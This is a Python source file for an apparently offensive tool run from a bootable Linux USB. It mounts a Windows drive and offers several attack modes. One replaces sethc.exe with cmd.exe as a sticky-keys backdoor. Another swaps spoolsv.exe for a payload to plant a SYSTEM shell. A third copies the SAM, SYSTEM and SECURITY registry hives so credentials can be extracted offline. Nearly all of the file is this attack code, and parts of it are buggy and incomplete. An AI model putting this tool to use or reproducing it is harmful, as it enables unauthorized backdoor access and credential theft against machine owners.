#!/usr/bin/env python3 

# Author: Keenan Kunzelman
# Description: Meant to be run on a linux bootable usb. Program scans 
# for all connected storage devices and looks for specific 
# file systems to mount and then exfils data. Only looks for NTFS 
#and exfils the calc.exe program for now.

#TO DO
#[]  Create Implanter class that abstracts shared behaviour between attacks
#[]  Allow Implanter to accept necessary paths for attack.
#    Can we make an generic cleaner that reverses any implants?
#[]  Create method / mechanism in Implanter for payload/attack choice
#[X] Abstract Drive / improve it, and then implement 
#[X]  Abstract interaction with blkid output / drive storage in a Scanner class

from scanner import Scanner
from drive import Drive
import sys, subprocess, argparse, time, shutil, os, datetime




 
def mount_drive(drive):
    # accepts a path to a drive that you would like to mount
    # mounts the target drive to /mna/windows
    # if /windows does not exist, smugglebus will try to make it for you
    try:
        os.mkdir('/mnt/windows')
        print('/mnt/windows has been created for you, and will'
                ' be used as a mounting point')
    except PermissionError:
        print('was unable to create mountpoint. Please run '
                'hashsnatcher as root.')
        sys.exit()
    except FileExistsError:
        print('/mnt/windows exists, and will be used as a '
                'mounting point')
    pipe = subprocess.Popen('sudo ntfs-3g -o remove_hiberfile {} '
            '/mnt/windows'.format(drive.get_source()),stdout=subprocess.PIPE, shell=True)
    time.sleep(1)


def locate_target_file(*target_dirs):

    sanatized_path = ['/mnt', 'windows']
    for target_dir in target_dirs:
        # this is named current assets because it can be a file or dir.
        current_assets = os.listdir("/".join(sanatized_path))
        if len(current_assets) == 0:
            print('\n\nlooks like the volume didnt mount because windows fs is in'
            ' a shitty state')
            print('exiting...')
            time.sleep(1)
            sys.exit()
        for current_asset in current_assets:
            if target_dir.casefold() == current_asset.casefold():  
                sanatized_path.append(current_asset)

    return "/".join(sanatized_path)


def get_sticky_shell():
    # gotta use the mount point made by mount_drive here from the 
    # user input i should implement some code that suggests a drive 
    # to choose based off of mounting other ones and lsing
    # them. This will be slow but very cool
    absolute_sticky_keyz_path = locate_target_file('windows', 'system32', 'sethc.exe')
    
    try:
        shutil.copyfile(absolute_sticky_keyz_path, 
                (absolute_sticky_keyz_path + '.bak')) 

    except FileNotFoundError as e:
        print(e)
        print(absolute_sticky_keyz_path + ' was not found')

    absolute_cmd_path = locate_target_file('windows', 'system32', 'cmd.exe')

    print(absolute_cmd_path)
    try:
        shutil.copyfile(absolute_cmd_path, absolute_sticky_keyz_path)

    except FileNotFoundError as e:
        print(e)
        print(absolute_cmd_path + ' was not found')

    print('stickykeyz binary has been succesfully swapped with cmd.exe')
    # optimize this...
    time.sleep(1)
    subprocess.Popen('sudo umount /mnt/windows', shell=True)
    print('Drive has been unmounted from /mnt/windows')


def revert_sticky_shell():
    # gotta use the mount point made by mount_drive here from the 
    # user input i should implement some code that suggests a drive 
    # to choose based off of mounting other ones and lsing
    # them. This will be slow but very cool

    absolute_sticky_keyz_path = locate_target_file('windows', 'system32', 
            'sethc.exe')
    absolute_sticky_keyz_bak_path = locate_target_file('windows', 'system32', 
            'sethc.exe.bak')
    try:
        shutil.copyfile(absolute_sticky_keyz_bak_path, absolute_sticky_keyz_path)
    except FileNotFoundError as e:
        print(e)
        print(absolute_sticky_keyz_bak_path + 'was not found')

    os.remove(absolute_sticky_keyz_bak_path)

    print('stickykeyz binary has been succesfully restored')
    # optimize this...
    time.sleep(1)
    subprocess.Popen('sudo umount /mnt/windows', shell=True)
    print('Drive has been unmounted from /mnt/windows')



def implant_SYSTEM_shell():
    absolute_spoolsv_path =  locate_target_file('windows',
                                    'system32',
                                    'spoolsv.exe')
    try:
        shutil.copyfile(absolute_spoolsv_path, (absolute_spoolsv_path + '.bak')) 

    except FileNotFoundError as e:
        print(e)
        print(absolute_spoolsv_path + ' was not found')
    try:
        shutil.copyfile('/home/tc/payloads/spoolsv.exe', absolute_spoolsv_path)
    except e:
        print(e)

def remove_SYSTEM_shell():
    absolute_spoolsv_bak_path = locate_target_file('windows',
                                        'system32',
                                        'spoolsv.exe.bak')
    absolute_spoolsv_path =  locate_target_file('windows',
                                        'system32',
                                        'spoolsv.exe')
    try:
        shutil.copyfile(absolute_spoolsv_bak_path,absolute_spoolsv_path)
    except FileNotFoundError as e:
        print(e)
    except e:
        print(e)

def locate_start_bak():
    pass
def implant_userland_shell():
    absolute_start_path = locate_target_file('windows',
                                        'programdata',
                                        'microsoft',
                                        'windows'
                                        'start menu',
                                        'programs',
                                        'startup',
                                        'start.exe'
                                        )
    pass
def remove_userland_shell():
    pass


def copy_registries():
    # gotta use the mount point made by mount_drive here from the 
    # user input i should implement some code that suggests a drive 
    # to choose based off of mounting other ones and lsing
    # them. This will be slow but very cool
    registry_names = ['sam','system','security','software']
    absolute_registry_paths = []
    for registry_name in registry_names:
        absolute_registry_paths.append(locate_target_file('windows', 
                'system32', 
                'config', 
                registry_name))
    
    stamp = str(datetime.datetime.now().timestamp())
    directory = '{}/hives_{}'.format(os.getcwd(), stamp[:10])
    os.mkdir(directory) 

    for path in absolute_registry_paths:
        try:
            shutil.copyfile(path, 
                    '{}/{}'.format(directory, path.split('/').pop()))
        except FileNotFoundError as e:
            print('{} not found'.format(path))

    print('registry hives have been succesfully exfiltrated to your pwd')
    # optimize this...
    time.sleep(1)
    subprocess.Popen('sudo umount /mnt/windows', shell=True)
    print('Drive has been unmounted from /mnt/windows')

def main():

    parser = argparse.ArgumentParser(
            description=('Choose which mode to run program in. No '
            'input lists all the storage devices.'))

    group = parser.add_mutually_exclusive_group()
    group.add_argument('-xh', 
            '--extract_hives', 
            action='store_true')

    # Maybe in here we can add a nargs field to allow user to input a target 
    # file sys for pretty print? and just have it default to all if no args are
    # provided?
    group.add_argument('-pd', 
            '--print_drives', 
            nargs='*', 
            metavar='target_fs' , 
            action='store')

    group.add_argument('-sk', 
            '--sticky_keyz', 
            action='store_true')
    group.add_argument('-rsk', 
            '--remove_sticky_keyz', 
            action='store_true')
    group.add_argument('-rss', 
            '--remove_system_shell', 
            action='store_true')
    group.add_argument('-ss', 
            '--system_shell', 
            action='store_true')

    args = parser.parse_args()

    # this grabs the raw text for the connected drives and stores it in an
    # object created from Scanner class. Maybe this should be called a scanner

    drives = Scanner()
    # two examples of using the pretty print function to get all the drives
    # and then an example on how to target a certain file system.
    #print(drives.pretty_print('all'))
    #print(drives.pretty_print('ntfs'))

    if args.extract_hives:
        # this will be the attack workflow going forward.
        # this will print out a table of drives that are numbered. The user
        # will then select a target. then that target is fed to 
        # drives.target_drive(target). this will return a single drive obj
        # that is to be targeted. 
        drives.pretty_print('ntfs')
        target = input('please choose a drive to target\n'
                'Please note drives start at 0 ')
        target_drive = drives.target_drive(target)
        
        # still need to implement the implanter class that will accept the target
        # drive as an arg, mount it, and then exploit it.
        if drives.check_for_windrives(raw_drives):
            copy_registries()

    if args.print_drives is not None:
        if len(args.print_drives) == 0:
            drives.pretty_print('all')
        elif len(args.print_drives) > 0:
            if args.print_drives[0] == 'ntfs':
                drives.pretty_print('ntfs')

    elif args.sticky_keyz:
        if Scanner.check_for_windrives(raw_drives):
            get_sticky_shell()
    elif args.remove_sticky_keyz:
        if Scanner.check_for_windrives(raw_drives):
            revert_sticky_shell()
    elif args.system_shell:
        if Scanner.check_for_windrives(raw_drives):
            implant_SYSTEM_shell()
    elif args.remove_system_shell:
        if Scanner.check_for_windrives(raw_drives):
            # remove_system_shell() needs to be fixed
            print('remove_system_shell not working')

if __name__ == '__main__':
    main()
    
# shit get cached in hybernation file?
